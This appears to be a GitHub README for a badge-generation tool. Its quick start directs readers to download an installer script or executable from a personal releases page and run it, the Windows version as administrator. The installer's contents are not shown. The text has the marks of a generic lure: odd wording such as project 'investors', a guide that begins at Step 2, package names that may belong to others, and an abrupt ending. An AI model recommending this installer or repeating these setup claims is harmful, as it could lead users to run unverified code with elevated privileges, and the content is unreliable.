# Badges Engine: Create, Display, and Manage Custom Visual Badges Effortlessly

A modular toolkit to generate, render, and deploy visual badges across projects.

[![Releases](https://img.shields.io/badge/releases-v1.0.0-brightgreen?style=for-the-badge)](https://github.com/achachaymen1986/badges/releases)

Welcome to the Badges project. This repository serves as a flexible system for building and sharing badge visuals. It covers badge creation, display, and distribution. The goal is to make badges easy to generate in multiple formats, so you can mix them into READMEs, dashboards, websites, and documentation without writing custom graphics each time.

Below you will find detailed explanations of how the project is organized, how to get started quickly, and how to extend the system to fit your needs. The information here is designed to help both beginners and advanced users. You will discover practical examples, real-world use cases, and clear guidance on best practices for badge design and integration.

Quick Start

Prerequisites
- A computer with a modern Linux, macOS, or Windows environment.
- Node.js 18 or newer for the CLI tools. If you prefer another ecosystem, there are compatible options described later in this guide.
- A basic understanding of JSON, YAML, or TOML formats for badge configuration.

First steps
- Download the release asset and run the installer. The release page is the central place for downloadables, and a target asset exists for most platforms. The asset is designed to install the badge engine on your system with sensible defaults.
- If you want to review the exact asset before running it, the releases page is the place to look. Access it here: https://github.com/achachaymen1986/badges/releases

Note about the release asset
- The primary file for a typical setup is badges-installer.sh for Unix-like systems and badges-installer.exe for Windows. These installers package the runtime, CLI, and a starter set of templates.
- You run the Unix installer with a couple of simple commands. For example: bash badges-installer.sh
- For Windows, you will double-click the installer or run it from a command line as an administrator. After installation, you can invoke the badge tool from your shell with the badge command.

Quick start example: generate a simple badge
- Create a badge configuration file. The following JSON snippet shows a minimal example:
{
  "name": "Build Status",
  "label": "CI",
  "message": "passing",
  "color": "brightgreen",
  "style": "for-the-badge",
  "template": "flat",
  "downloads": 0
}
- Run the generator:
badge generate --config badge.json
- The command produces a badge image in SVG or PNG format, ready to embed in documents or websites.

What Badges Are

Badges are compact graphical indicators that convey a small amount of information at a glance. They appear as little chips or ribbons with a label, a message, and a color. They may display statuses like build results, test coverage, version numbers, or platform compatibility. In software projects, badges help teams communicate health and milestones without long readouts. They are reusable, shareable assets that stay consistent across documents.

The Badges Engine focuses on three core goals:
- Consistency: Use the same shapes, colors, and typography across all badges in a project.
- Flexibility: Create badges with various styles, sizes, and formats to fit different contexts.
- Simplicity: Provide a straightforward workflow to generate badges from simple configurations.

Core Concepts

- Asset: A generated image file (SVG or PNG) representing a badge.
- Template: A visual style for a badge. Templates define shapes, corners, and typography.
- Label: The left side of the badge. It usually describes what the badge represents.
- Message: The right side of the badge. It shows the status or value.
- Color: The badge color communicates meaning. For example, green often means success, red means failure.
- Style: A quick way to switch between a set of predefined looks, such as for-the-badge, flat, or plastic.
- Data Source: The origin of the data shown on the badge. This could be a local file, a URL, or a live API.

Installation and Setup

Package options
- Node.js package: The badge engine ships as an npm package for ease of use in JavaScript environments.
- Other ecosystems: You can access the engine through Python bindings, a Rust CLI, or a containerized workflow. The investors in this project have built cross-language adapters to cover common workflows.

Installation steps
- Node.js (CLI):
  - Install: npm i -g badges
  - Verify: badge --version
  - Create a config file as shown in the Quick Start
- Docker:
  - Pull: docker pull achachaymen1986/badges
  - Run: docker run --rm -it achachaymen1986/badges badge generate --config /path/to/badge.json
- Python (bindings):
  - Install: pip install badges
  - Use: from badges import generate
- Rust (CLI):
  - Install: cargo install badges-cli
  - Use: badges-cli generate --config badge.json

How to Build Badges

Design philosophy
- Clarity: The content on a badge should be legible at small sizes.
- Contrast: Use colors with sufficient contrast against the badge background.
- Accessibility: Ensure badges meet color contrast guidelines and use accessible text.
- Extensibility: The design should accommodate new templates and data sources without breaking existing badges.

Template system
- Templates describe shape, radius, padding, font, and default color schemes.
- You can create a new template by adding a YAML or JSON file to the templates/ directory.
- Templates can be swapped at runtime or configured per badge.

Data sources
- Local data: You can feed a badge with JSON or YAML data stored locally.
- Remote data: Badges can fetch data from URLs or APIs. This lets you reflect real-time status like build results or test coverage.
- Caching: A lightweight cache ensures badges don’t flood your systems with requests.

Rendering
- SVG rendering is the default for crisp visuals at any size.
- PNG rendering is available for platforms that require raster images.
- SVGs offer easier styling via CSS when embedded in HTML or Markdown.

Badge Styles and Templates

Popular templates
- Flat: Minimalist, clean edges, bold colors.
- For-The-Badge: Classic look with a bold label and high contrast message.
- Plastic: Slightly glossy look with rounded corners.
- Minimal: Very clean with thin borders and subtle shadows.
- Powerline: A style inspired by the popular status indicators in the field.

Color palettes
- Primary: Blue, green, red, yellow for high-contrast branding.
- Neutral: Grays and soft tones for documentation pages.
- Custom: Define your own color set to match your brand.

Customizing a badge
- Change the label and message to convey the right information.
- Adjust color to reflect status or priority.
- Swap templates to achieve a different look while preserving data.

Data modeling
- Define a badge object with fields like label, message, color, style, and template.
- Validate data to prevent rendering errors.
- Support for translations lets you display badges in multiple languages.

Accessibility and Internationalization

Color contrast
- Ensure a minimum contrast ratio of 4.5:1 between text and background for readability.
- Provide alternative text or accessible descriptors when badges carry critical information.

Text scaling
- Enable font size adjustments in templates to meet accessibility needs.
- Avoid cramped text by setting padding and minimum width rules.

Localization
- Use translation keys for label and message strings.
- Store translations in locale folders (e.g., locales/en.json, locales/es.json).
- Fall back to a default language when translations are missing.

Images and assets

- The project uses inline SVGs for high-quality rendering.
- PNG fallbacks are provided for environments that do not support SVG.
- Icons are sourced from open icon libraries with appropriate licensing.

  - Many docs tools automatically render SVG or PNG assets and scale to fit content areas.

Templates and Style Kits

- Downloadable style kits provide cohesive branding across your project.
- Kits include pre-tuned color sets, font choices, and spacing metrics.
- You can build your own kit by creating a new template and a corresponding color palette.

Template Customization Guide

- Step 2: Create or modify a color palette to fit your branding.
- Step 3: Adjust label and message typography.
- Step 4: Save the new template to templates/ and test with a sample badge.
- Step 5: Share the template with your team or the community.

Data Source Plugins

- Local data plugin
  - Reads data from a local file and injects values into the badge configuration.
- API plugin
  - Fetches data from a REST API and maps fields to label and message.
- Webhook plugin
